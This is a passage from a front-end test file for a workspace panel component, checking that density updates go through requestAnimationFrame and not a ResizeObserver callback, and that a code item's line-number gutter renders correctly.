    // and has been observed to abort an in-progress drag.
    expect(WORKSPACE_PANEL_CODE).not.toMatch(/new ResizeObserver\([\s\S]{0,200}?setDensity/);
    expect(WORKSPACE_PANEL_CODE).toMatch(/requestAnimationFrame\([\s\S]{0,120}?setDensity/);
  });

  it("renders the gutter it computed", () => {
    const item = seed({ userId: null, kind: "code", title: "x.py", content: "a\nb\nc" });
    mountPanel({ selectedId: item.id });
    const gutter = host.querySelector('pre[aria-hidden="true"]')!;
    expect(gutter.textContent).toBe("1\n2\n3");
  });
});
